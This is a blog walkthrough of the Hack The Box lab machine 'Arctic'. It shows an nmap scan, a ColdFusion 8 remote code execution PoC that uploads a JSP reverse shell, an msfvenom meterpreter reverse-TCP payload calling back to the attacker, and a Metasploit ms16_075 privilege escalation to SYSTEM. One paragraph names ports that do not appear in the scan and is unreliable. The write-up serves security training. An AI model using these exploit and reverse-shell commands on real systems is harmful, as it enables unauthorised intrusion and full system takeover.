---
layout: post
title: Arctic
date: 2025-12-07 13:00:00 +0100
categories: [Walkthroughs]
tags: [htb, Windows, NTFS, hashcat, privesc]
---
![alt text](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/0d6275efbd5e48fcdc96e61b9724ae5e.png)

---

| Description    |  Info |
| --------- | ----------- |
| Platform    | Hack The box       |
| OS | Windows        |
| Difficulty | Easy        |
| Release Date | 22nd March, 2017       |
| Link to machine | [Arctic](https://app.hackthebox.com/machines/Arctic?tab=play_machine)        |

# Highlights
Windows Enumeration, HTTP, Metasploit, Searchsploit, Windows Privilege Escalation

---

# Open ports enumeration
Lets start by starting an nmap scan after adding ```Artic.htb``` to our ```/etc/hosts``` file

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ nmap -T4 -A -p- arctic.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 20:28 GMT
Nmap scan report for arctic.htb (10.10.10.11)
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   44.08 ms 10.10.14.1
2   44.24 ms arctic.htb (10.10.10.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 271.97 seconds
```

The interesting findings here are:```21/ftp```, ```80/http```, ```2049/tcp```

FTP not only is vulnerable but ```NMAP``` is confirming ```Anonymous FTP login allowed```
HTTP port 80 is a website which requires further enumeration
NFS 2049 is interesting as it allows file sharing between Windows and non-Windows systems


Connecting to ```FTP``` does not bring any results, so let's enumerate ```2049/tcp``` which is NFS.

# Port 8500 Enumeration

Right away we find an uncommon port ```8500```, researching this port we find that ```FMTP``` is utilized by an HTTP service called ```ColdFusion``` which could be vulnerable to ```RCE```

Navigating to http://arctic.htb:8500/ we find two directories ```CFIDE``` and ```cfdocs```

![alt text](https://raw.githubusercontent.com/Kyd0s/Kyd0s.github.io/refs/heads/main/assets/images/Arctic(HTB)/Arctic1.png)

Into the ```/CFIDE/``` directory, we find a login page ```http://arctic.htb:8500/CFIDE/administrator```
![alt text](https://raw.githubusercontent.com/Kyd0s/Kyd0s.github.io/refs/heads/main/assets/images/Arctic(HTB)/Arctic2.png)
![alt text](https://raw.githubusercontent.com/Kyd0s/Kyd0s.github.io/refs/heads/main/assets/images/Arctic(HTB)/Arctic3.png)

We have confirmation the port 8500 is running ```Adobe Cold Fusion 8```, and as explained in this [post](https://nika0x38.github.io/toolsmith/payloads/CVE-2009-2265/), it is vulnerable to ```Unauthenticated Remote Code Execution```.

Using [this](https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265) ```PoC```, we are able to craft a malicious ```JSP file```, upload it to the webserver and execute it to have a reverse shell.

# Start the Listener

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ nc -lnvp 4444

```

# Foothold

Where ```-l``` is localhost, ```-p``` the port of our listener, ```-r``` the target host and ```-q``` port of the target host

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ wget https://raw.githubusercontent.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265/refs/heads/master/CVE-2009-2265
--2025-12-07 21:18:39--  https://raw.githubusercontent.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265/refs/heads/master/CVE-2009-2265
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3634 (3.5K) [text/plain]
Saving to: ‘CVE-2009-2265’

CVE-2009-2265                  100%[====================================================>]   3.55K  --.-KB/s    in 0s      

2025-12-07 21:18:40 (84.6 MB/s) - ‘CVE-2009-2265’ saved [3634/3634]
                                                                                                                        
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ chmod +x CVE-2009-2265  

┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ ./CVE-2009-2265 -l 10.10.14.9 -p 4444 -r 10.10.10.11 -q 8500

/CVE-2009-2265: line 40: uuidgen: command not found
[+] Generating JSP reverse shell payload...
[+] Payload saved as '.jsp'.
./CVE-2009-2265: line 54: uuidgen: command not found
[+] Uploading the payload to the target...
./CVE-2009-2265: line 71: warning: command substitution: ignored null byte in input
[+] Server response:


                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 0, "/userfiles/file/.jsp/.txt", ".txt", "0" );
                </script>
[+] Netcat listener detected running on port 4444!
[+] Attempting to trigger the payload...
[-] Failed to trigger the payload. Target may not have executed the payload.
[+] Cleaning up local files...
[+] Done!

```
Checking our listener, we can see the reverse shell

# Post-Exploitation Enumeration

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.11] 49409
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```
Results of ```whoami```, ```whoami /priv```, ```whoami /groups``` and ```systeminfo```

```bash 
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 ��
System Boot Time:          9/12/2025, 6:24:42 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     6.143 MB
Available Physical Memory: 5.100 MB
Virtual Memory: Max Size:  12.285 MB
Virtual Memory: Available: 11.273 MB
Virtual Memory: In Use:    1.012 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

C:\ColdFusion8\runtime\bin>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group

C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

# From reverse shell to Meterpreter shell
Since this is a Windows Server 2008, there will be loads of vulnerabilities that we can exploit, so let's move to a meterpreter shell to take advange of the power of metasploit enumeration tools

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=6666 -f exe -o reverse.exe
```
We create a reverse shell using ```msfvenom``` and upload it to the victim machine using the existing shell and a python http server from your attacker machine, then we start the metasploit listener

```bash
┌──(Kyd0s㉿kali)-[~/HTB/Arctic]
└─$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.9; set lport 6666; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.10.14.9
lport => 6666
[*] Started reverse TCP handler on 10.10.14.9:6666 
```
execute ```reverse.exe``` on the attacker machine and will received the meterpreter shell on the attacker machine 

```bash
[*] Sending stage (203846 bytes) to 10.10.10.11
[*] Meterpreter session 1 opened (10.10.14.9:6666 -> 10.10.10.11:49522) at 2025-12-07 21:53:04 +0000

meterpreter > getuid
Server username: ARCTIC\tolis
meterpreter > 

```
# Local_Exploit_Suggester from metasploit

```bash
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.11 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.10.10.11 - 206 exploit checks are being tried...
[+] 10.10.10.11 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.11 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.11 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.11 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Running check method for exploit 49 / 49
[*] 10.10.10.11 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.                                                                                                                     
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.                                                                                                                     
 3   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                                                                                     
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.                                                                                                                     
 5   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.                                                                                                                     
 6   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                          
 7   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.                                                                                                                     
 8   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!                                                     
 9   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.                                                                                                                     
 10  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.                                                                                                                     
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                                                      
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.                                                                                                                     
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.

```
There is a lot of results, so after trying some of the exploits, we settle on ```exploit/windows/local/ms16_075_reflection_juicy```


# Privilege Escalation
```bash
use exploit/windows/local/ms16_075_reflection_juicy
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_075_reflection_juicy) > options

Module options (exploit/windows/local/ms16_075_reflection_juicy):

   Name     Current Setting                         Required  Description
   ----     ---------------                         --------  -----------
   CLSID    {4991d34b-80a1-4291-83b6-3328366b9097}  yes       Set CLSID value of the DCOM to trigger
   SESSION                                          yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  none             yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.57.7     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms16_075_reflection_juicy) > set session 1 
session => 1
msf exploit(windows/local/ms16_075_reflection_juicy) > set lhost tun0
lhost => 10.10.14.9
msf exploit(windows/local/ms16_075_reflection_juicy) > run
[*] Started reverse TCP handler on 10.10.14.9:4444 
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[*] Launching notepad to host the exploit...
[+] Process 3448 launched.
[*] Reflectively injecting the exploit DLL into 3448...
[*] Injecting exploit into 3448...
[*] Exploit injected. Injecting exploit configuration into 3448...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.11
[*] Meterpreter session 2 opened (10.10.14.9:4444 -> 10.10.10.11:49551) at 2025-12-07 21:58:58 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```
Now that we own the system, we can spawn a shell as ```NT AUTHORITY\SYSTEM``` and collect both the user and root flag :)

Enjoy!